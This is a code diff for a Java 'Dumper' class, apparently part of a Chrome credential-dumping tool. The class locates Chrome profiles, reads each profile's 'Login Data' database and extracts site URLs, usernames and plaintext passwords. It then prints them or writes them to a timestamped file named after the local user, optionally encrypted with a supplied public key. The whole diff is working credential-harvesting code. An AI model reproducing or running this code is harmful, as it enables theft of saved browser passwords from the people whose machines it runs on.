@@ -16,13 +16,14 @@ import java.util.*;
 
 public class Dumper {
 
-    private final Map<File, ChromeAccount[]> profiles;
+//    private final ChromeAccount[] profiles;
+    private final Map<String, ChromeAccount[]> profiles;
 
-    private Dumper(final Map<File, ChromeAccount[]> profiles) {
+        private Dumper(final Map<String, ChromeAccount[]> profiles) {
         this.profiles = profiles;
     }
 
-    public static Dumper dumpAccounts(String path) throws Exception, IOException, InstantiationException {
+    public static Dumper dumpAccounts() throws Exception {
         final OperatingSystem os = OperatingSystem.getOperatingsystem();
         if (os == OperatingSystem.UNKNOWN) {
             throw new Exception(System.getProperty("os.name") + " is not supported by this application!");
@@ -34,31 +35,36 @@ public class Dumper {
             throw new IOException("Google chrome intallation not found.");
         }
 
-        ArrayList<ChromeProfile> profiles;
+        ArrayList<ChromeProfile> chromeProfiles;
         final String[] infoLines = Files.readAllLines(Paths.get(chromeInfo.toURI())).toArray(new String[]{});
         switch (OperatingSystem.getOperatingsystem()) {
             case WINDOWS:
-                profiles = Dumper.readProfiles(infoLines);
+                chromeProfiles = Dumper.readProfiles(infoLines);
                 break;
             case MAC:
                 final String line = infoLines[0];
                 final String lines[] = line.split("\\{|\\}");
-                profiles = Dumper.readProfiles(lines);
+                chromeProfiles = Dumper.readProfiles(lines);
                 break;
             default:
                 throw new Exception(System.getProperty("os.name") + " is not supported by this application!");
         }
 
-        final String pathToSave = OperatingSystem.getOperatingsystem().getSavePath();
-        final HashMap<File, ChromeAccount[]> accounts = new HashMap<>();
-        for (final ChromeProfile profile : profiles) {
+        final HashMap<String, ChromeAccount[]> accounts = new HashMap<>();
+        for (final ChromeProfile profile : chromeProfiles) {
             final File loginData = new File(chromeInstall.toString() + File.separator + profile.getPath(), "Login Data");
-            accounts.put(new File(path != null && !path.equals("")
-                    ? path + System.getProperty("file.separator")
-                    : pathToSave,
-                    getCurrentTime() + "-" + System.getProperty("user.name") + ".txt"), Dumper.readDatabase(loginData));
+            accounts.put(profile.getName(), Dumper.readDatabase(loginData));
         }
-        if (profiles.size() < 1 || accounts.isEmpty()) {
+//        final String pathToSave = OperatingSystem.getOperatingsystem().getSavePath();
+//        final HashMap<File, ChromeAccount[]> accounts = new HashMap<>();
+//        for (final ChromeProfile profile : chromeProfiles) {
+//            final File loginData = new File(chromeInstall.toString() + File.separator + profile.getPath(), "Login Data");
+//            accounts.put(new File(path != null && !path.equals("")
+//                    ? path + System.getProperty("file.separator")
+//                    : pathToSave,
+//                    getCurrentTime() + "-" + System.getProperty("user.name") + ".txt"), Dumper.readDatabase(loginData));
+//        }
+        if (chromeProfiles.size() < 1 || accounts.isEmpty()) {
             throw new InstantiationException("No chrome profiles found!");
         }
         return new Dumper(accounts);
@@ -70,75 +76,111 @@ public class Dumper {
         return currentTime.format(cal.getTime());
     }
 
-    private static ChromeAccount[] readDatabase(final File data) throws IOException, Exception {
+    private static ChromeAccount[] readDatabase(final File data) throws Exception {
         final ChromeDatabase db = ChromeDatabase.connect(data);
         final ArrayList<ChromeAccount> accounts = db.selectAccounts();
         db.close();
         return accounts.toArray(new ChromeAccount[]{});
     }
 
-    private static ArrayList<ChromeProfile> readProfiles(final String[] infoLines) {
+    private static ArrayList<ChromeProfile> readProfiles(String[] infoLines1) {
+        String userName = "\"user_name\":";
+        String gaiaName = "\"gaia_name\":";
+        String gaia_given_name = "gaia_given_name";
+        String[] infoLines = infoLines1[0].split(gaia_given_name);
         final ArrayList<ChromeProfile> profiles = new ArrayList<>();
         int id = 0;
         for (String line : infoLines) {
             line = line.trim();
-            String userName = "\"user_name\":";
-            if (line.startsWith(",\"Profile ") || line.contains("\"Default\":")) {
-//            if (line.startsWith(userName) || line.contains(userName)) {
+            if (line.contains(userName)) {
                 id++;
             }
-//            if (line.contains(userName) && id > profiles.size()) {
+
+            String gaiaNameVal = "";
+            if (line.contains(gaiaName)) {
+                gaiaNameVal = getValue(line, gaiaName);
+            }
+            String name = "";
             if (line.contains(userName)) {
-                final int nameIndex = line.indexOf("\"user_name\":") + (OperatingSystem.getOperatingsystem() == OperatingSystem.WINDOWS ? 9 : 8);
-//                final int nameIndex = line.indexOf(userName) + userName.length();
-                final int lastIndex = line.indexOf("\"", nameIndex);
-                profiles.add(new ChromeProfile(id - 1, line.substring(nameIndex, lastIndex)));
+                name = getValue(line, userName);
+            }
+            if (!name.isEmpty()) {
+                profiles.add(new ChromeProfile(id - 1, name, gaiaNameVal));
             }
         }
         return profiles;
+    }
+
+    private static String getValue(String line, String prop) {
+        final int nameIndex = line.indexOf(prop);
+        final int firstValIndex = line.indexOf("\"", nameIndex + prop.length());
+        final int lastValIndex = line.indexOf("\"", firstValIndex + 1);
+        return line.substring(firstValIndex + 1, lastValIndex);
     }
 
     public int getAmountOfProfiles() {
         return profiles.keySet().size();
     }
 
-    public String getDumpLocation() {
-        return profiles.keySet().iterator().next().getParent();
-    }
+//    public String getDumpLocation() {
+//        return profiles.keySet().iterator().next().getParent();
+//    }
 
     public int getDumpSize() {
         return profiles.values().stream().mapToInt(b -> b.length).sum();
     }
 
-    public boolean saveToFile(String pubKeyPath) throws IOException {
-        for (final File file : profiles.keySet()) {
-            if (file.exists()) {
-                file.delete();
-            }
-            file.getParentFile().mkdirs();
-            file.createNewFile();
-            final ChromeAccount[] accounts = profiles.get(file);
+    public boolean saveToFile(String newFiePath, String pubKeyPath) throws IOException {
+
+        final List<String> lines = getInfo();
+
+        final String pathToSave = OperatingSystem.getOperatingsystem().getSavePath();
+        File file = new File(newFiePath != null && !newFiePath.equals("")
+                ? newFiePath + System.getProperty("file.separator")
+                : pathToSave,
+                getCurrentTime() + "-" + System.getProperty("user.name") + ".txt");
+
+        if (file.exists()) {
+            file.delete();
+        }
+        file.getParentFile().mkdirs();
+        file.createNewFile();
+
+        if (pubKeyPath != null && !pubKeyPath.isEmpty()) {
+            String encoded = Encryption.encrypt(pubKeyPath, lines.toString());
+            Files.write(file.toPath(), Collections.singletonList(encoded), StandardCharsets.UTF_8);
+        } else {
+            Files.write(file.toPath(), lines, StandardCharsets.UTF_8);
+        }
+
+        return true;
+    }
+
+    public void show() {
+        final List<String> lines = getInfo();
+        lines.forEach(System.out::println);
+    }
+
+    private List<String> getInfo() {
+        final List<String> lines = new ArrayList<>();
+        for (final String name : profiles.keySet()) {
+            final ChromeAccount[] accounts = profiles.get(name);
+            lines.add("==================================================");
+            lines.add(name);
+            lines.add("==================================================");
             if (accounts.length > 0) {
-                final List<String> lines = new ArrayList<>();
                 for (final ChromeAccount account : accounts) {
                     if (!account.getURL().equals("") || !account.getUsername().equals("") || !account.getPassword().equals("")) {
-                        lines.add("URL: " + account.getURL());
-                        lines.add("Username: " + account.getUsername());
-                        lines.add("Password: " + account.getPassword());
+                        lines.add("URL:\t\t" + account.getURL());
+                        lines.add("Username:\t" + account.getUsername());
+                        lines.add("Password:\t" + account.getPassword());
                         lines.add("");
                     }
                 }
                 lines.remove(lines.size() - 1);
-
-                if (pubKeyPath != null && !pubKeyPath.isEmpty()) {
-                    String encoded = Encryption.encrypt(pubKeyPath, lines.toString());
-                    Files.write(file.toPath(), Collections.singletonList(encoded), StandardCharsets.UTF_8);
-                } else {
-                    Files.write(file.toPath(), lines, StandardCharsets.UTF_8);
-                }
             }
         }
-        return true;
+        return lines;
     }
 
     public static void get(String url) {
